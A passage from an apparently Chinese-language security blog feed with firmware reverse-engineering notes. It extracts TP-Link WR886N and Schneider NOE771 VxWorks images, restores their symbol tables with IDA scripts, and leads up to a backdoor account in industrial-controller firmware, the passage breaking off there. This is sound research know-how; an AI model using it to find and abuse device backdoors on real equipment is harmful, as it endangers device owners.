title="后续"></a>后续</h1><p>DIR-850L的最新固件<code>DIR850LB1_FW223WWb01</code>也是被加密的，而解密进程就在FW220中，使用上述方法即可解密固件^_^</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;固件下载地址：&lt;a href=&quot;http://files.dlink.com.au/Products/DIR-850L/REV_B/Firmware/Firmware_v2.20b03/DIR850LB1_FW220WWb03.bin&quot; target=&quot;_blank&quot; re</summary>
      
    
    
    
    <category term="笔记" scheme="p1Kk.github.io/categories/笔记/"/>
    
    
    <category term="iot" scheme="p1Kk.github.io/tags/iot/"/>
    
  </entry>
  
  <entry>
    <title>TP-Link WR886N v6 升级包固件分析（VxWorks 恢复符号表）</title>
    <link href="p1Kk.github.io/2021/06/12/iot/tplink%20wr886%20v6/"/>
    <id>p1Kk.github.io/2021/06/12/iot/tplink%20wr886%20v6/</id>
    <published>2021-06-11T16:00:00.000Z</published>
    <updated>2021-06-17T08:04:22.210Z</updated>
    
    <content type="html"><![CDATA[<p>download：<a href="https://service.tp-link.com.cn/detail_download_8676.html" target="_blank" rel="noopener">https://service.tp-link.com.cn/detail_download_8676.html</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ binwalk TL-WR886N\ V6.0_2.3.8\ Build\ 190826\ Rel.54648n.bin </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">12656         0x3170          U-Boot version string, &quot;U-Boot 1.1.4 (May  8 2016 - 07:42:47)&quot;</span><br><span class="line">12704         0x31A0          CRC32 polynomial table, big endian</span><br><span class="line">13932         0x366C          uImage header, header size: 64 bytes, header CRC: 0x773178DD, created: 2016-05-08 14:42:48, image size: 20788 bytes, Data Address: 0x80010000, Entry Point: 0x80010000, data CRC: 0x983BDABA, OS: Linux, CPU: MIPS, image type: Firmware Image, compression type: lzma, image name: &quot;u-boot image&quot;</span><br><span class="line">13996         0x36AC          LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 52148 bytes</span><br><span class="line">41472         0xA200          LZMA compressed data, properties: 0x6E, dictionary size: 8388608 bytes, uncompressed size: 2372176 bytes   📌</span><br><span class="line">791104        0xC1240         LZMA compressed data, properties: 0x5A, dictionary size: 8388608 bytes, uncompressed size: 1731 bytes</span><br><span class="line">792301        0xC16ED         LZMA compressed data, properties: 0x5A, dictionary size: 8388608 bytes, uncompressed size: 7272 bytes</span><br><span class="line">793897        0xC1D29         LZMA compressed data, properties: 0x5A, dictionary size: 8388608 bytes, uncompressed size: 200 bytes</span><br><span class="line">794124        0xC1E0C         LZMA compressed data, properties: 0x5A, dictionary size: 8388608 bytes, uncompressed size: 247 bytes</span><br><span class="line">...</span><br><span class="line"># 可以使用binwalk直接获取，解压后的文件A200就是我们下面想要一步步提取的系统文件</span><br><span class="line">$ binwalk -Me TL-WR886N\ V6.0_2.3.8\ Build\ 190826\ Rel.54648n.bin</span><br></pre></td></tr></table></figure><p>这里有U-Boot，CRC32，uImage header，在0xA200处有一个2M多的lzma压缩包</p><h1 id="提取"><a href="#提取" class="headerlink" title="提取"></a>提取</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> dd提取uImage镜像 skip = uImage header<span class="string">'s start_addr | count = image size+header size</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> dd <span class="keyword">if</span>=TL-WR886N\ V6.0_2.3.8\ Build\ 190826\ Rel.54648n.bin of=uboot.img bs=1 skip=13932 count=749632</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> binwalk uboot.img </span></span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             uImage header, header size: 64 bytes, header CRC: 0x773178DD, created: 2016-05-08 14:42:48, image size: 20788 bytes, Data Address: 0x80010000, Entry Point: 0x80010000, data CRC: 0x983BDABA, OS: Linux, CPU: MIPS, image type: Firmware Image, compression type: lzma, image name: "u-boot image"</span><br><span class="line">64            0x40            LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 52148 bytes</span><br><span class="line">27540         0x6B94          LZMA compressed data, properties: 0x6E, dictionary size: 8388608 bytes, uncompressed size: 2372176 bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> dd解压镜像lzma数据</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> dd <span class="keyword">if</span>=uboot.img of=uboot.lzma bs=1 skip=64 </span></span><br><span class="line">？？？</span><br><span class="line">暂不分析</span><br></pre></td></tr></table></figure><p>对于2M大小的lzma压缩包，可能会有我们想要的信息，提取出来</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> skip = start_addr | count = next_start_addr - start_addr = 791104-41472</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> dd <span class="keyword">if</span>=TL-WR886N\ V6.0_2.3.8\ Build\ 190826\ Rel.54648n.bin of=A200.lzma bs=1 skip=41472 count=749632  </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 解压</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> lzma -d A200.lzma </span></span><br><span class="line">lzma: A200.lzma: Compressed data is corrupt</span><br></pre></td></tr></table></figure><p>使用winhex查看bin文件</p><p>在0xA200的结尾0xC1240上下都有数据存在，而上方的FF FF更像是文件结束的位置</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/tlwr886hex1.png" alt></p><p>再看到0xA200处，前面都是00 00，很明显的结束</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/tlwr886hex2.png" alt></p><p>所以找到0xA200真正的结束位置是在0xC0F1A，即count = 0xC0F1B - 0xA200 = 748827</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/tlwr886hex3.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> $ dd if=TL-WR886N\ V6.0_2.3.8\ Build\ 190826\ Rel.54648n.bin of=A200.lzma bs=1 skip=41472 count=748827  </span><br><span class="line">$ lzma -d A200.lzma</span><br><span class="line"></span><br><span class="line"># 查看解压后的文件A200，应该就是我们想要的系统文件</span><br><span class="line">$ binwalk A200 </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">1851668       0x1C4114        Certificate in DER format (x509 v3), header length: 4, sequence length: 4</span><br><span class="line">1858956       0x1C5D8C        Certificate in DER format (x509 v3), header length: 4, sequence length: 4</span><br><span class="line">1904512       0x1D0F80        VxWorks operating system version &quot;5.5.1&quot; , compiled: &quot;Aug 26 2019, 15:10:48&quot;</span><br><span class="line">1973916       0x1E1E9C        Copyright string: &quot;Copyright(C) 2001-2011 by TP-LINK TECHNOLOGIES CO., LTD.&quot;</span><br><span class="line">2003596       0x1E928C        VxWorks WIND kernel version &quot;2.6&quot;</span><br><span class="line">2048864       0x1F4360        HTML document header</span><br><span class="line">2048929       0x1F43A1        HTML document footer</span><br><span class="line">2069052       0x1F923C        PEM certificate</span><br><span class="line">2069108       0x1F9274        PEM RSA private key</span><br><span class="line">2078560       0x1FB760        Base64 standard index table</span><br><span class="line">2087437       0x1FDA0D        StuffIt Deluxe Segment (data): f</span><br><span class="line">2113876       0x204154        CRC32 polynomial table, big endian</span><br><span class="line">2114900       0x204554        CRC32 polynomial table, big endian</span><br><span class="line">2115924       0x204954        CRC32 polynomial table, big endian</span><br><span class="line">2116948       0x204D54        CRC32 polynomial table, big endian</span><br><span class="line">2137292       0x209CCC        XML document, version: &quot;1.0&quot;</span><br><span class="line">2156884       0x20E954        SHA256 hash constants, big endian</span><br><span class="line">2254945       0x226861        StuffIt Deluxe Segment (data): f</span><br><span class="line">2254976       0x226880        StuffIt Deluxe Segment (data): fError</span><br></pre></td></tr></table></figure><h1 id="恢复符号表"><a href="#恢复符号表" class="headerlink" title="恢复符号表"></a>恢复符号表</h1><p>导入ida进行分析（设置为MIPS big endian），和<a href="https://p1kk.github.io/2021/06/11/iot/%E6%96%BD%E8%80%90%E5%BE%B7%20NOE771/" target="_blank" rel="noopener">上次</a>遇到的情况一样，还是什么都分析不出来。需要确定加载基址。</p><p>前面在使用binwalk查看bin文件时，在uboot imgae header中有<code>Data Address: 0x80010000, Entry Point: 0x80010000</code>，但是这应该只是uboot的加载基址。</p><p>在0xa200前也发现了疑似header数据段指向了0x80001000，而这个地址也正是许多固件文件的加载地址。尝试使用该地址作为加载地址</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/tlwr886hex4.png" alt></p><p>依旧还是什么都没有，不过通过在一些地址按”C”，可以自动分析出函数，最终解析出了两千多个函数，依旧没有符号表信息，且通过分析该文件，并没有找到符号表相关。在通过binwalk解压出的文件中查找<code>bzero</code>函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ grep -r bzero ./</span><br><span class="line">Binary file ./C2E58 matches</span><br><span class="line"></span><br><span class="line"># _TL-WR886N V6.0_2.3.8 Build 190826 Rel.54648n.bin.extracted中只有三个binary文件</span><br><span class="line">36AC uboot文件</span><br><span class="line">A200 固件系统</span><br><span class="line">C2E58 符号文件</span><br></pre></td></tr></table></figure><p>查看C2E58文件，可以找出符号索引的规律，同时符号表中的符号之间用\x00分隔</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/tlwr886hex5.png" alt></p><p>利用idapython修复符号表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"></span><br><span class="line">symfile_path = <span class="string">'C:\\C2E58'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 符号起始</span></span><br><span class="line">symbols_table_start = <span class="number">8</span></span><br><span class="line"><span class="comment"># 字符串起始</span></span><br><span class="line">strings_table_start = <span class="number">0x9d80</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(symfile_path, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    symfile_contents = f.read()</span><br><span class="line"></span><br><span class="line">symbols_table = symfile_contents[symbols_table_start:strings_table_start]</span><br><span class="line">strings_table = symfile_contents[strings_table_start:]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_strings_by_offset</span><span class="params">(offset)</span>:</span></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> strings_table[offset+index] != <span class="number">0</span>:</span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> strings_table[offset:offset+index]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_symbols_metadata</span><span class="params">()</span>:</span></span><br><span class="line">    symbols = []</span><br><span class="line">    <span class="keyword">for</span> offset <span class="keyword">in</span> range(<span class="number">0</span>, len(symbols_table), <span class="number">8</span>):</span><br><span class="line">        <span class="comment"># 一个符号的段落</span></span><br><span class="line">        symbol_item = symbols_table[offset:offset+<span class="number">8</span>]</span><br><span class="line">        <span class="comment"># 标志位</span></span><br><span class="line">        flag = symbol_item[<span class="number">0</span>]</span><br><span class="line">        print(flag)</span><br><span class="line">        <span class="comment"># 符号偏移</span></span><br><span class="line">        string_offset = int(symbol_item[<span class="number">1</span>:<span class="number">4</span>].hex(), <span class="number">16</span>)</span><br><span class="line">        print(string_offset)</span><br><span class="line">        <span class="comment"># 根据符号偏移找到符号名</span></span><br><span class="line">        string_name = get_strings_by_offset(string_offset).decode(<span class="string">"utf-8"</span>)</span><br><span class="line">        print(string_name)</span><br><span class="line">        <span class="comment"># 符号在文件内存中的地址</span></span><br><span class="line">        target_address = int(symbol_item[<span class="number">4</span>:].hex(), <span class="number">16</span>)</span><br><span class="line">        print(target_address)</span><br><span class="line">        <span class="comment"># 列表</span></span><br><span class="line">        symbols.append((flag, string_name, target_address))</span><br><span class="line">    <span class="keyword">return</span> symbols</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_symbols</span><span class="params">(symbols_meta_data)</span>:</span></span><br><span class="line">    <span class="comment"># 对于列表symbols_meta_data中的数据</span></span><br><span class="line">    <span class="keyword">for</span> flag, string_name, target_address <span class="keyword">in</span> symbols_meta_data:</span><br><span class="line">        <span class="comment"># 对目标地址进行重命名</span></span><br><span class="line">        idc.set_name(target_address, str(string_name))</span><br><span class="line">        <span class="keyword">if</span> flag == <span class="string">'\x54'</span>:</span><br><span class="line">            <span class="comment"># 指定地址 字节转化为指令</span></span><br><span class="line">            idc.MakeCode(target_address)</span><br><span class="line">            <span class="comment"># 指定地址转换成函数</span></span><br><span class="line">            idc.MakeFunction(target_address)</span><br><span class="line">            </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    symbols_metadata = get_symbols_metadata()</span><br><span class="line">    add_symbols(symbols_metadata)</span><br></pre></td></tr></table></figure><p>也可以直接通过\x00进行字符串截断<code>symbol_strings = strings_table.split(chr(0))</code>，直接挨个儿放到target_address去…个人感觉不如根据偏移找到符号名再放精准..</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/tlwr886finalida.png" alt="仍有部分未被修复"></p><blockquote><p>Reference：</p><p><a href="https://www.secpulse.com/archives/75635.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/75635.html</a></p><p><a href="https://cq674350529.github.io/2018/09/19/TP-Link-wr886v6-%E5%9B%BA%E4%BB%B6%E8%A7%A3%E6%9E%90/" target="_blank" rel="noopener">https://cq674350529.github.io/2018/09/19/TP-Link-wr886v6-%E5%9B%BA%E4%BB%B6%E8%A7%A3%E6%9E%90/</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;download：&lt;a href=&quot;https://service.tp-link.com.cn/detail_download_8676.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://service.tp-link.com.cn</summary>
      
    
    
    
    <category term="笔记" scheme="p1Kk.github.io/categories/笔记/"/>
    
    
    <category term="iot" scheme="p1Kk.github.io/tags/iot/"/>
    
  </entry>
  
  <entry>
    <title>施耐德 NOE771 后门分析（ida函数恢复）</title>
    <link href="p1Kk.github.io/2021/06/11/iot/%E6%96%BD%E8%80%90%E5%BE%B7%20NOE771/"/>
    <id>p1Kk.github.io/2021/06/11/iot/%E6%96%BD%E8%80%90%E5%BE%B7%20NOE771/</id>
    <published>2021-06-10T16:00:00.000Z</published>
    <updated>2021-06-15T06:55:59.694Z</updated>
    
    <content type="html"><![CDATA[<p>固件下载地址：<a href="https://github.com/ameng929/NOE77101_Firmware/blob/master/FLASH0/wwwroot/conf/exec/NOE77101.bin" target="_blank" rel="noopener">https://github.com/ameng929/NOE77101_Firmware/blob/master/FLASH0/wwwroot/conf/exec/NOE77101.bin</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ binwalk -Me NOE77101.bin</span><br><span class="line">$ cd _NOE77101.bin.extracted/</span><br><span class="line">$ binwalk 385</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">2054252       0x1F586C        EST flat binary</span><br><span class="line">2088936       0x1FDFE8        HTML document header</span><br><span class="line">2108532       0x202C74        HTML document footer</span><br><span class="line">2110048       0x203260        HTML document header</span><br><span class="line">2115564       0x2047EC        HTML document footer</span><br><span class="line">2119528       0x205768        XML document, version: &quot;1.0&quot;</span><br><span class="line">2119796       0x205874        XML document, version: &quot;1.0&quot;</span><br><span class="line">2119912       0x2058E8        XML document, version: &quot;1.0&quot;</span><br><span class="line">2192512       0x217480        Base64 standard index table</span><br><span class="line">2192580       0x2174C4        Base64 standard index table</span><br><span class="line">2211604       0x21BF14        VxWorks WIND kernel version &quot;2.5&quot;</span><br><span class="line">2225264       0x21F470        Copyright string: &quot;Copyright Wind River Systems, Inc., 1984-2000&quot;</span><br><span class="line">2321952       0x236E20        Copyright string: &quot;copyright_wind_river&quot;</span><br><span class="line">3118988       0x2F978C        Copyright string: &quot;Copyright, Real-Time Innovations, Inc., 1991.  All rights reserved.&quot;</span><br><span class="line">3126628       0x2FB564        Copyright string: &quot;Copyright 1984-1996 Wind River Systems, Inc.&quot;</span><br><span class="line">3153524       0x301E74        VxWorks symbol table, big endian, first entry: [type: function, code address: 0x1FF058, symbol address: 0x27655C]</span><br></pre></td></tr></table></figure><p>固件的操作系统为VxWorks2.5，符号表位于0x301E74</p><p>确定CPU架构为PowerPC big endian</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ binwalk -A 385</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">160           0xA0            PowerPC big endian instructions, function epilogue</span><br><span class="line">400           0x190           PowerPC big endian instructions, function epilogue</span><br><span class="line">408           0x198           PowerPC big endian instructions, function prologue</span><br><span class="line">460           0x1CC           PowerPC big endian instructions, function epilogue</span><br><span class="line">468           0x1D4           PowerPC big endian instructions, function prologue</span><br><span class="line">516           0x204           PowerPC big endian instructions, function epilogue</span><br><span class="line">524           0x20C           PowerPC big endian instructions, function prologue</span><br><span class="line">616           0x268           PowerPC big endian instructions, function epilogue</span><br><span class="line">624           0x270           PowerPC big endian instructions, function prologue</span><br></pre></td></tr></table></figure><h1 id="固件内存加载地址"><a href="#固件内存加载地址" class="headerlink" title="固件内存加载地址"></a>固件内存加载地址</h1><p>嵌入式系统固件需要加载到内存中特定位置运行，这个特定位置就是<strong>固件加载地址</strong></p><blockquote><p>固件加载地址 = 符号表中字符串的地址 - 相应字符串在固件中的偏移</p></blockquote><p>嵌入式系统固件的函数调用地址是基于固件加载地址所计算出的内存位置，而不是固件中的地址</p><p>1、ELF封装的固件文件，在ELF文件的头部有特定的数据位记录了该固件的加载地址，</p><p>如果有ELF封装头部，因此我们可以直接读取ELF文件头，从而直接获取到固件的加载地址。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> readelf -a vxworks</span><br><span class="line">...</span><br><span class="line">Entry point address:0x10000</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>2、分析固件头部的初始化代码，如<code>usrInit</code>这是vxWorks系统引导后运行的第一个函数，它初始化栈的地址（R1寄存器）就是固件的内存加载地址【不太明白为什么不是0xFFF0，因为我后面算出来也是0xFFF0】(因为我已经修复好符号表，并加载了基址，我也没有那种拖进去就有一部分函数的版本，所以下面就用这个已经修复好的分析了)</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/noe771loadaddr.png" alt></p><p>3、找到bss区数据初始化代码，bss区在VxWorks中主要用于存储一些当前未赋值的变量，系统启动过程中Vxworks使用<code>bzero</code>函数对bss数据清零</p><p><code>usrInit</code>函数还会首先对bss进行清理，第一个跳转函数就是bss初始化函数，进入后的第一个跳转函数就是<code>bzero</code>，根据他的两个参数可以分析出bss的起始和结束地址，r3=bss_startaddr  r4=bss_endaddr</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/noe711bssstart.png" alt></p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/noe711bssstart_end.png" alt="r3=bss_startaddr r4=bss_endaddr"></p><p>由于VxWorks系统的内存布局为</p><p><img src="https://images.seebug.org/content/images/2018/12/330e73a4-15c7-4267-8efa-5f0f17a27826.jpg" alt=" "></p><p>所以用<code>_end - 固件大小</code>即可得到加载地址 0x490d2c - 0x480d2c = 0x10000</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/noe771size.png" alt></p><p>4、如果IDA可以分析出少数函数，可以根据 调用地址 一般写为 偏移量+绝对地址 中的绝对地址，来确定固件加载地址</p><p>5、分析符号表查看，本例介绍</p><p>拖入ida查看</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/noe771idainto.jpg" alt></p><p>什么都没解析出来。</p><p>VxWorks系列的字节排序有独特的格式，以16个字节为一组数据，前4个字节是函数名的内存地址，后4个字节是函数的内存位置，然后以另4个特征字节数据+4个字节0x00结尾。</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/noe771winhex.png" alt="0x301e74"></p><p>最后一个字符串会在符号表中第一个被引用，最后的字符串为<code>APP_STATION_MODBUS</code>(我也不确定为什么)</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/noe771winhexlastone.png" alt="最后一个字符串"></p><p>0x27655c - 0x26656c = 0xFFF0….（根据后面用idc跑出来的函数列表来看，这是错误的固件加载地址，应该是0x10000，这又是为什么啊）</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/noe711idaloadin.png" alt></p><p>加载后还是什么都咩有…</p><h1 id="符号表修复函数名"><a href="#符号表修复函数名" class="headerlink" title="符号表修复函数名"></a>符号表修复函数名</h1><p>符号表的起始地址为0x301E64+load_addr，结束地址为0x3293a4+load_addr</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/noe771winhexsymbolend.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">/* Ruben Santamarta - IOActive */</span><br><span class="line">/* Rebuild VxWorks Symbol Table */</span><br><span class="line"></span><br><span class="line">#include &lt;idc.idc&gt;</span><br><span class="line"></span><br><span class="line">static main()</span><br><span class="line">&#123;</span><br><span class="line">     auto load_addr;</span><br><span class="line"> auto ea;</span><br><span class="line"> auto offset;</span><br><span class="line"> auto sName;</span><br><span class="line"> auto eaStart;</span><br><span class="line"> auto eaEnd; </span><br><span class="line"></span><br><span class="line">// You&apos;ll need to adjust these values</span><br><span class="line">load_addr = 0x10000;</span><br><span class="line">eaStart = 0x301E64 + load_addr;</span><br><span class="line">eaEnd = 0x3293a4 + load_addr;</span><br><span class="line"></span><br><span class="line"> SetStatus(IDA_STATUS_WORK);</span><br><span class="line"> ea = eaStart;</span><br><span class="line"> </span><br><span class="line"> while( ea &lt; eaEnd) &#123;</span><br><span class="line"> MakeDword( ea );</span><br><span class="line"> offset = 0;</span><br><span class="line"> if ( Dword( ea ) == 0x900 || Dword( ea ) == 0x500)</span><br><span class="line"> &#123;</span><br><span class="line"> offset = 8;</span><br><span class="line"> &#125;</span><br><span class="line"> else if( Dword( ea ) == 0x90000 || Dword( ea ) == 0x50000 )</span><br><span class="line"> &#123;</span><br><span class="line"> offset = 0xc;</span><br><span class="line"> &#125; </span><br><span class="line"> if( offset )</span><br><span class="line"> &#123;</span><br><span class="line"> MakeStr( Dword( ea - offset ), BADADDR); </span><br><span class="line"> sName = GetString( Dword( ea - offset ), -1, ASCSTR_C ) ; </span><br><span class="line">  if ( sName )</span><br><span class="line">  &#123;</span><br><span class="line">  if( Dword( ea ) == 0x500 || Dword( ea ) == 0x50000)</span><br><span class="line">  &#123;</span><br><span class="line">      if (  GetFunctionName( Dword( ea - offset + 4) ) == &quot;&quot; )</span><br><span class="line">      &#123;</span><br><span class="line">      MakeCode( Dword( ea - offset + 4) );</span><br><span class="line"> MakeFunction( Dword( ea - offset + 4), BADADDR );</span><br><span class="line">      &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  MakeName( Dword( ea - offset + 4 ), sName );  </span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> ea = ea + 4;   </span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> SetStatus(IDA_STATUS_READY);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过调用关系<code>_sysInit -&gt; usrInit -&gt; usrKernelInit -&gt; usrRoot -&gt; usrAppInit</code></p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/noe771userinit.png" alt></p><p>发现后门账号</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/noe771usrandpasswd.png" 